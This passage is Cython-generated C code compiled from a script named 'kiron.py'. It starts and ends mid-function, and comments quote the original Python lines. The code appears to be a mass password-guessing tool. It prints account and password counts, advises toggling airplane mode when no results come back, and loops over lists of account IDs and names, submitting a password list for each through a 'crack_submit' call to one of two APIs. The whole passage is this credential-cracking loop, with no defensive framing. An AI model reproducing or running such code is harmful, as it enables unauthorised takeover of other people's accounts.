                __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
                __pyx_t_4 = 0;
                __Pyx_INCREF(__pyx_kp_u__25);
                __pyx_t_8 += 1;
                __Pyx_GIVEREF(__pyx_kp_u__25);
                PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__25);
                __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_total_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__25); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                /* "kiron.py":300
 *                                         total_ids = str(len(fo))
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m\x1b[38;5;46m{A} '+total_ids+f' ')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASS \x1b[38;5;244m\x1b[38;5;46m{A} {ps_limit} \x1b[38;5;244m[{A}M{mthd}\x1b[38;5;244m]')             # <<<<<<<<<<<<<<
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
 *                                         linex()
 */
                __pyx_t_5 = PyTuple_New(11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_8 = 0;
                __pyx_t_9 = 127;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
                __pyx_t_8 += 12;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
                PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_38_5_244m_2);
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
                __pyx_t_6 = 0;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24);
                __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
                __pyx_t_8 += 51;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24);
                PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24);
                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
                __pyx_t_4 = 0;
                __Pyx_INCREF(__pyx_kp_u__25);
                __pyx_t_8 += 1;
                __Pyx_GIVEREF(__pyx_kp_u__25);
                PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__25);
                __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ps_limit, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_4);
                __pyx_t_4 = 0;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_3);
                __pyx_t_8 += 13;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_3);
                PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_kp_u_38_5_244m_3);
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_6);
                __pyx_t_6 = 0;
                __Pyx_INCREF(__pyx_n_u_M);
                __pyx_t_8 += 1;
                __Pyx_GIVEREF(__pyx_n_u_M);
                PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_n_u_M);
                __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_mthd, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_5, 9, __pyx_t_6);
                __pyx_t_6 = 0;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m);
                __pyx_t_8 += 12;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m);
                PyTuple_SET_ITEM(__pyx_t_5, 10, __pyx_kp_u_38_5_244m);
                __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 11, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                /* "kiron.py":301
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m\x1b[38;5;46m{A} '+total_ids+f' ')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASS \x1b[38;5;244m\x1b[38;5;46m{A} {ps_limit} \x1b[38;5;244m[{A}M{mthd}\x1b[38;5;244m]')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         for user in fo:
 */
                __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 301, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_8 = 0;
                __pyx_t_9 = 127;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
                __pyx_t_8 += 12;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
                PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_38_5_244m_2);
                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 301, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 301, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
                __pyx_t_4 = 0;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT);
                __pyx_t_8 += 122;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT);
                PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT);
                __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 301, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 301, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                /* "kiron.py":302
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASS \x1b[38;5;244m\x1b[38;5;46m{A} {ps_limit} \x1b[38;5;244m[{A}M{mthd}\x1b[38;5;244m]')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')
 */
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 302, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = NULL;
                __pyx_t_7 = 0;
                #if CYTHON_UNPACK_METHODS
                if (unlikely(PyMethod_Check(__pyx_t_4))) {
                  __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
                  if (likely(__pyx_t_6)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                    __Pyx_INCREF(__pyx_t_6);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_4, function);
                    __pyx_t_7 = 1;
                  }
                }
                #endif
                {
                  PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
                  __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 302, __pyx_L41_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                }
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                /* "kiron.py":303
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
 *                                         linex()
 *                                         for user in fo:             # <<<<<<<<<<<<<<
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 */
                if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 303, __pyx_L41_error) }
                if (likely(PyList_CheckExact(__pyx_v_fo)) || PyTuple_CheckExact(__pyx_v_fo)) {
                  __pyx_t_5 = __pyx_v_fo; __Pyx_INCREF(__pyx_t_5);
                  __pyx_t_8 = 0;
                  __pyx_t_18 = NULL;
                } else {
                  __pyx_t_8 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_v_fo); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 303, __pyx_L41_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __pyx_t_18 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 303, __pyx_L41_error)
                }
                for (;;) {
                  if (likely(!__pyx_t_18)) {
                    if (likely(PyList_CheckExact(__pyx_t_5))) {
                      {
                        Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_5);
                        #if !CYTHON_ASSUME_SAFE_MACROS
                        if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 303, __pyx_L41_error)
                        #endif
                        if (__pyx_t_8 >= __pyx_temp) break;
                      }
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_8); __Pyx_INCREF(__pyx_t_4); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 303, __pyx_L41_error)
                      #else
                      __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_5, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 303, __pyx_L41_error)
                      __Pyx_GOTREF(__pyx_t_4);
                      #endif
                    } else {
                      {
                        Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_5);
                        #if !CYTHON_ASSUME_SAFE_MACROS
                        if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 303, __pyx_L41_error)
                        #endif
                        if (__pyx_t_8 >= __pyx_temp) break;
                      }
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_8); __Pyx_INCREF(__pyx_t_4); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 303, __pyx_L41_error)
                      #else
                      __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_5, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 303, __pyx_L41_error)
                      __Pyx_GOTREF(__pyx_t_4);
                      #endif
                    }
                  } else {
                    __pyx_t_4 = __pyx_t_18(__pyx_t_5);
                    if (unlikely(!__pyx_t_4)) {
                      PyObject* exc_type = PyErr_Occurred();
                      if (exc_type) {
                        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                        else __PYX_ERR(0, 303, __pyx_L41_error)
                      }
                      break;
                    }
                    __Pyx_GOTREF(__pyx_t_4);
                  }
                  __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
                  __pyx_t_4 = 0;

                  /* "kiron.py":304
 *                                         linex()
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')             # <<<<<<<<<<<<<<
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:
 */
                  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L41_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  __pyx_t_16 = NULL;
                  __pyx_t_7 = 0;
                  #if CYTHON_UNPACK_METHODS
                  if (likely(PyMethod_Check(__pyx_t_6))) {
                    __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
                    if (likely(__pyx_t_16)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                      __Pyx_INCREF(__pyx_t_16);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_6, function);
                      __pyx_t_7 = 1;
                    }
                  }
                  #endif
                  {
                    PyObject *__pyx_callargs[2] = {__pyx_t_16, __pyx_kp_s__32};
                    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 304, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_4);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                  }
                  if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                    PyObject* sequence = __pyx_t_4;
                    Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                    if (unlikely(size != 2)) {
                      if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                      else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                      __PYX_ERR(0, 304, __pyx_L41_error)
                    }
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    if (likely(PyTuple_CheckExact(sequence))) {
                      __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                      __pyx_t_16 = PyTuple_GET_ITEM(sequence, 1); 
                    } else {
                      __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                      __pyx_t_16 = PyList_GET_ITEM(sequence, 1); 
                    }
                    __Pyx_INCREF(__pyx_t_6);
                    __Pyx_INCREF(__pyx_t_16);
                    #else
                    __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __pyx_t_16 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 304, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_16);
                    #endif
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  } else {
                    Py_ssize_t index = -1;
                    __pyx_t_15 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 304, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_15);
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __pyx_t_22 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_15);
                    index = 0; __pyx_t_6 = __pyx_t_22(__pyx_t_15); if (unlikely(!__pyx_t_6)) goto __pyx_L49_unpacking_failed;
                    __Pyx_GOTREF(__pyx_t_6);
                    index = 1; __pyx_t_16 = __pyx_t_22(__pyx_t_15); if (unlikely(!__pyx_t_16)) goto __pyx_L49_unpacking_failed;
                    __Pyx_GOTREF(__pyx_t_16);
                    if (__Pyx_IternextUnpackEndCheck(__pyx_t_22(__pyx_t_15), 2) < 0) __PYX_ERR(0, 304, __pyx_L41_error)
                    __pyx_t_22 = NULL;
                    __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                    goto __pyx_L50_unpacking_done;
                    __pyx_L49_unpacking_failed:;
                    __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                    __pyx_t_22 = NULL;
                    if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                    __PYX_ERR(0, 304, __pyx_L41_error)
                    __pyx_L50_unpacking_done:;
                  }
                  __Pyx_XDECREF_SET(__pyx_v_ids, __pyx_t_6);
                  __pyx_t_6 = 0;
                  __Pyx_XDECREF_SET(__pyx_v_names, __pyx_t_16);
                  __pyx_t_16 = 0;

                  /* "kiron.py":305
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist             # <<<<<<<<<<<<<<
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 */
                  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_plist); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 305, __pyx_L41_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __Pyx_XDECREF_SET(__pyx_v_passlist, __pyx_t_4);
                  __pyx_t_4 = 0;

                  /* "kiron.py":306
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 */
                  __Pyx_INCREF(__pyx_v_mthd);
                  __pyx_t_4 = __pyx_v_mthd;
                  __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 306, __pyx_L41_error)
                  if (!__pyx_t_11) {
                  } else {
                    __pyx_t_10 = __pyx_t_11;
                    goto __pyx_L52_bool_binop_done;
                  }
                  __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 306, __pyx_L41_error)
                  __pyx_t_10 = __pyx_t_11;
                  __pyx_L52_bool_binop_done:;
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __pyx_t_11 = __pyx_t_10;
                  if (__pyx_t_11) {

                    /* "kiron.py":307
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(api1,ids,names,passlist)             # <<<<<<<<<<<<<<
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 */
                    __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 307, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_16);
                    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_api1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 307, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __pyx_t_15 = NULL;
                    __pyx_t_7 = 0;
                    #if CYTHON_UNPACK_METHODS
                    if (likely(PyMethod_Check(__pyx_t_16))) {
                      __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_16);
                      if (likely(__pyx_t_15)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                        __Pyx_INCREF(__pyx_t_15);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_16, function);
                        __pyx_t_7 = 1;
                      }
                    }
                    #endif
                    {
                      PyObject *__pyx_callargs[5] = {__pyx_t_15, __pyx_t_6, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist};
                      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 4+__pyx_t_7);
                      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 307, __pyx_L41_error)
                      __Pyx_GOTREF(__pyx_t_4);
                      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                    }
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                    /* "kiron.py":306
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 */
                    goto __pyx_L51;
                  }

                  /* "kiron.py":308
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')
 */
                  __Pyx_INCREF(__pyx_v_mthd);
                  __pyx_t_4 = __pyx_v_mthd;
                  __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 308, __pyx_L41_error)
                  if (!__pyx_t_10) {
                  } else {
                    __pyx_t_11 = __pyx_t_10;
                    goto __pyx_L54_bool_binop_done;
                  }
                  __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 308, __pyx_L41_error)
                  __pyx_t_11 = __pyx_t_10;
                  __pyx_L54_bool_binop_done:;
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __pyx_t_10 = __pyx_t_11;
                  if (__pyx_t_10) {

                    /* "kiron.py":309
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api2,ids,names,passlist)             # <<<<<<<<<<<<<<
 *                                 print('\033[1;37m')
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 */
                    __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 309, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_16);
                    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_api2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 309, __pyx_L41_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __pyx_t_15 = NULL;
                    __pyx_t_7 = 0;
                    #if CYTHON_UNPACK_METHODS
                    if (likely(PyMethod_Check(__pyx_t_16))) {
                      __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_16);
                      if (likely(__pyx_t_15)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                        __Pyx_INCREF(__pyx_t_15);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_16, function);
                        __pyx_t_7 = 1;
                      }
                    }
                    #endif
                    {
